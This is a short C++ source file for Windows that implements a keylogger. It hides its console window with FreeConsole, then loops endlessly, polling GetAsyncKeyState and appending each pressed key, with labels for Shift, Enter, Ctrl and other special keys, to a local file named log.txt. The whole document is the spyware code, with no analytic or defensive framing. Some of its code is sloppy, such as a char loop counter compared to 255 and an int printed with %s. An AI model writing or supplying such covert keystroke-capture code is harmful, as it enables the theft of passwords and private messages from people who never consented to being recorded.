#include <iostream>
#include <windows.h>

using namespace std;

int Save(int _key, char *file);

int main(){
    FreeConsole();

    char i;
    while(true) {
    Sleep(10);
    for(i=8; i<=255; i++) {
        if(GetAsyncKeyState(i)== -32767){
            Save(i, "log.txt");
        }
    }

} 
return 0;
}

int Save(int _key, char *file) {
    cout<< _key << endl;
    Sleep(10);
    FILE *OUTPUT_FILE; // can also use the ofstream command
    OUTPUT_FILE = fopen(file, "a+"); //a+ is used to add new keys each time, and not overwrite
    switch(_key)
    {
        case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]");
            break;
        case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]");
            break;
        case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LBUTTON]");
            break;
        case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RBUTTON]");
            break;
        case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]");
            break;
        case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]");
            break;
        case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]");
            break;
        case VK_CONTROL: fprintf(OUTPUT_FILE, "[Ctrl]");
            break;
        case VK_MENU: fprintf(OUTPUT_FILE, "[Alt]");
            break;
        case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS Lock]");
            break;
        case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]");
            break;
    }
    fprintf(OUTPUT_FILE, "%s", &_key);
    fclose(OUTPUT_FILE);
    return 0;
}